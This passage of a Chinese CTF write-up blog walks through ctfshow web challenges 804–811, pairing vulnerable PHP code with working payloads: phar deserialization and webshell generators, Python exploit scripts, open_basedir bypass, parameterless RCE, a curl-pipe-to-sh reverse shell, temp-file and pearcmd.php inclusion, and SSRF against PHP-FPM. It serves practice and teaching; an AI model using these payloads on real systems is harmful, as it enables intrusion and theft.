class="line">requests.post(url=url,data=data1)</span><br><span class="line">r = requests.post(url=url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里记得得把生成的phar包，放到这个脚本所在的目录下。</p><p>phar实现文件包含原理：当与包含函数结合后，会直接执行phar中的内容，达到命令执行的效果</p><h2 id="web804-phar反序列化"><a href="#web804-phar反序列化" class="headerlink" title="web804(phar反序列化)"></a>web804(phar反序列化)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|data|ftp/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用特点：有<code>file_put_contents</code>实现文件上传的目的，将<code>phar</code>文件上传到题目服务器上，然后<code>file_exists</code>和<code>unlink</code>的影响函数，都可以触发<code>phar的反序列化</code>，从而达到反序列化中的命令执行</p><p>phar文件的生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hacker</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;code=<span class="string">&quot;system(&#x27;cat f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里话是先写一个反序列化链子，然后在把phar的部分拼接上去</p><p>然后上传，触发命令执行，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">url=<span class="string">&quot;http://bf1f07fe-9a6c-4425-994b+7886f64b2923.challenge.ctf.show/index.php&quot;</span></span><br><span class="line">data1=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;shell.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">data2=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">requests.post(url,data=data1)</span><br><span class="line">r=requests.post(url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>和phar文件包含差不多的意思，对于这个脚本来说。</p><p>(这里上一题的生成phar包的方式是一模一样的)</p><h2 id="web805-open-basedir绕过"><a href="#web805-open-basedir绕过" class="headerlink" title="web805(open_basedir绕过)"></a>web805(<strong>open_basedir绕过</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>这题有点简略</p><p><a href="https://blog.csdn.net/unexpectedthing/article/details/125577789">这篇文章写的非常详细了，有好多种方法，可以去尝试尝试</a></p><p><a href="https://www.cnblogs.com/hookjoy/p/12846164.html">这篇文章也是</a></p><p><img src="../images/image-20230305161156758.png" alt="image-20230305161156758"></p><p>发现只有当前目录可读。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/ctfshowflag&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里的话尾部可控，可以进行想要的指令进行输入输出。  </p><p>例如查看根目录的话  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure><p>只要尾部代码换掉就行</p><h2 id="web806-无参RCE"><a href="#web806-无参RCE" class="headerlink" title="web806(无参RCE)"></a>web806(无参RCE)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/9360">文章</a></p><p><a href="https://blog.csdn.net/qq_45570082/article/details/106602261">文章2</a></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;shell=cat /c*;</span><br></pre></td></tr></table></figure><p>这里的shell参数的名字可以随便改，因为这样写的话是加一个数组参数在最后面，然后end的时候就会选到他。</p><p>然后最后就会</p><p><code>eval(system(cat /c*))</code></p><p>然后进行命令执行了</p><h2 id="web807-反弹shell"><a href="#web807-反弹shell" class="headerlink" title="web807(反弹shell)"></a>web807(反弹shell)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$schema</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$url</span>,<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$schema</span>===<span class="string">&quot;https://&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;curl <span class="subst">$url</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://your-shell.com/你的公网ip冒号你的开放端口空格|sh</span><br></pre></td></tr></table></figure><p>这是其中一个反弹shell的方法。</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=https:<span class="comment">//;curl https://your-shell.com/你的公网ip冒号你的开放端口空格|sh</span></span><br></pre></td></tr></table></figure><p>这里话是可以在自己的服务器上进行命令执行了。</p><p><img src="../images/image-20230305170129849.png" alt="image-20230305170129849"></p><p>这两篇文章还有其他的反弹shell的方法  <a href="https://blog.csdn.net/weixin_45751765/article/details/124160978">文章1</a>  <a href="https://blog.csdn.net/weixin_45751765/article/details/124160978">文章2</a></p><h2 id="web808-卡临时文件包含"><a href="#web808-卡临时文件包含" class="headerlink" title="web808(卡临时文件包含)"></a>web808(<strong>卡临时文件包含</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-03-20 11:01:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-03-20 22:18:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/tmp&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考点：文件包含，session文件包含getshell，利用Segfault遗留下临时文件文件进行getshell</p><p><strong>1.利用Segfault遗留下临时文件文件进行getshell：</strong></p><p>条件：php7.1.20以下</p><p>原理：就是利用php crash后，会导致上传的临时文件保留下来，然后对其进行文件包含达到RCE的情况</p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">p牛写的文章</a></p><p>给出了/tmp下的文件，所有不需要爆破出tmp文件，直接包含</p><p>其实就是让程序崩溃的同时上传文件，那么文件就会留在/tmp目录下</p><p>php代码中使用php://filter的strip_tags 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url = <span class="string">&quot;http://6c9ff9d7-497d-4912-942c-0ab8c8d54175.challenge.ctf.show/&quot;</span></span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.<span class="title function_ invoke__">post</span>(url+<span class="string">&#x27;?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span>,files=file)</span><br><span class="line">r=requests.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line"><span class="comment">#print(r.text)</span></span><br><span class="line">tmp=re.<span class="title function_ invoke__">findall</span>(<span class="string">&#x27;=&gt; (php.*?)\\n&#x27;</span>,r.text,re.S)[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span>(tmp)</span><br><span class="line">r=requests.<span class="title function_ invoke__">get</span>(url+<span class="string">&#x27;?file=/tmp/&#x27;</span>+tmp)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>这个payload的意思就是先整出tmp的文件名，然后在去访问没有被清理的文件下面进行RCE</p><p><img src="../images/image-20230306162325031.png" alt="image-20230306162325031"></p><h2 id="web809-pear文件包含-RCE"><a href="#web809-pear文件包含-RCE" class="headerlink" title="web809(pear文件包含/RCE)"></a>web809(<strong>pear文件包含/RCE</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-03-20 11:01:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-03-20 22:18:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log|filter/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考点：文件包含，pearcmd.php文件包含到RCE</p><p>1.安装了pear（这样才能有pearcmd.php），在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定—with-pear才会安装。<br>2.开启了register_argc_argv，Docker环境下的PHP会开启register_argc_argv这个配置</p><p>3.存在文件包含且可以包含后缀为php的文件且没有<code>open_basedir</code>的限制。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>+/tmp/a.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230306163611428.png" alt="image-20230306163611428"></p><p>先用bp发包，然后访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/tmp/a.txt</span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /*&#x27;</span>);</span><br></pre></td></tr></table></figure><p>详细解释 </p><p><a href="https://blog.csdn.net/rfrder/article/details/121042290?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165691505116782425121278%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165691505116782425121278&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-121042290-null-null.185%5Ev2%5Etag_show&amp;utm_term=pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4450">文章</a></p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">文章1</a></p><h2 id="web810-SSRF打PHP-FPM"><a href="#web810-SSRF打PHP-FPM" class="headerlink" title="web810(SSRF打PHP-FPM)"></a>web810(<strong>SSRF打PHP-FPM</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_FOLLOWLOCATION,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>这是SSRF打fastcgi，之前在SSRF专题那边是打mysql和redis</p><p>工具下载地址<code>https://github.com/tarunkant/Gopherus</code><br>打fastcgi用法：<br><code>gopherus --exploit fastcgi</code></p><p>这里不知道为啥，没打通 </p><p>然后把_后面的语句进行url编码 然后传参就能拿到flag。</p><h2 id="web811-file-put-contents打PHP-FPM"><a href="#web811-file-put-contents打PHP-FPM" class="headerlink" title="web811(file_put_contents打PHP-FPM)"></a>web811(<strong>file_put_contents打PHP-FPM</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 